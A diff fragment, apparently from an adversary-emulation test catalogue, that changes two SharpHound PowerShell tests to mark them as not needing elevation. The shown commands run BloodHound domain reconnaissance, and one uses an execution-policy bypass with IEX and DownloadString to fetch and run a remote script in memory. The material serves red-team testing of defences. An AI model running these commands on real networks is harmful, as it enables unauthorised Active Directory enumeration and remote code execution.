@@ -23364,7 +23364,7 @@ execution:
           -OutFile "#{file_path}\SharpHound.ps1"
       executor:
         name: powershell
-        elevation_required: true
+        elevation_required: false
         command: "write-host \"Import and Execution of SharpHound.ps1 from #{file_path}\"
           -ForegroundColor Cyan\nimport-module #{file_path}\\SharpHound.ps1; invoke-bloodhound
           -domain #{internal_domain} -OutputDirectory #{output_path}\n \n"
@@ -23387,7 +23387,7 @@ execution:
           default: PathToAtomicsFolder\T1086\src
       executor:
         name: powershell
-        elevation_required: true
+        elevation_required: false
         command: "write-host \"Remote download of SharpHound.ps1, import and execution
           from $env:temp\" -ForegroundColor Cyan\npowershell -exec Bypass -C \"IEX(New-Object
           Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');Invoke-BloodHound
